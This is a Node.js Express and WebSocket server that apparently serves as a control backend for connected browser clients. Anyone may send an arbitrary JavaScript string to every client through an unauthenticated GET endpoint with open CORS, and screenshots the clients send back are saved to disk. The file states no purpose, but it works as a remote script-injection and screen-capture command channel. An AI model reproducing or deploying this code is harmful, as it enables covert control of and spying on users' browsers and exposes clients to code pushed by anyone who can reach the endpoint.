const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const fs = require('fs');

const PORT = process.env.PORT || 8080;

const app = express();
app.use(cors());
app.use(express.json()); // Parse JSON bodies

// Create HTTP server
const server = http.createServer(app);

// Attach WebSocket server to the same HTTP server
const wss = new WebSocket.Server({ server });

// Track connected clients
const clients = new Set();

// WebSocket logic
wss.on('connection', (ws, req) => {
    console.log('New WebSocket client connected');
    clients.add(ws);

    ws.on('message', (message) => {
        if (!Buffer.isBuffer(message)) {
            const text = message.toString();
            if (text === 'ping') return;
            console.log('Received from client:', text);
            return;
        };
        fs.writeFileSync('screenshot.png', message);
        console.log('Saved screenshot.png');
    });

    ws.on('close', () => {
        console.log('WebSocket client disconnected');
        clients.delete(ws);
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
        clients.delete(ws);
    });
});

// HTTP API endpoint to send JS to all connected clients
// POST /api/broadcast-js
// Body: { "script": "alert('hello from server')" }
app.get('/api/broadcast-js', (req, res) => {
    const { script } = req.query;

    if (typeof script !== 'string') {
        return res.status(400).json({
            error: "Missing ?script= in URL"
        });
    }

    let sentCount = 0;

    for (const ws of clients) {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(script);
            sentCount++;
        }
    }

    return res.json({
        status: 'ok',
        sentTo: sentCount
    });
});

// Optional: simple health check
app.get('/', (req, res) => {
    res.send('WebSocket JS broadcast server is running');
});

// Start server
server.listen(PORT, () => {
    console.log(`HTTP + WebSocket server listening on port ${PORT}`);
    console.log(`WebSocket URL: ws://localhost:${PORT}`);

});




